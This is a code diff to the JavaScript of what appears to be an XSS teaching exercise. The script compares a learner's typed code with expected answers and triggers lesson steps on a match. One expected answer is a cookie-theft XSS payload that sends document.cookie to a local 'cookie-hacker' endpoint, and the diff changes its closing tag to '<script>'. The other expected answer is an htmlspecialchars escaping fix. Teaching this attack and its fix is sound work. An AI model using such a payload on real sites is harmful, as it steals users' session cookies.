@@ -53,15 +53,18 @@ $(document).ready(function() {
             }
             if (
                 code ==
-                "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);</script>"
+                "<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);<script>"
             ) {
                 SetTimeOut("nine", 1000);
                 SetTimeOut("ten", 6000);
                 SetTimeOut("eleven", 10000);
                 SetTimeOut("twelve", 12000);
             }
-            if(code=="if(isset($_GET['search']))returnhtmlspecialchars($_GET['search']);")
-                    SetTimeOut("sixteen", 1000);
+            if(code=="if(isset($_GET['search']))returnhtmlspecialchars($_GET['search']);"){
+                SetTimeOut("sixteen", 1000);
+                SetTimeOut("seventeen", 6000);
+            }
+            
 
         });
         // access url
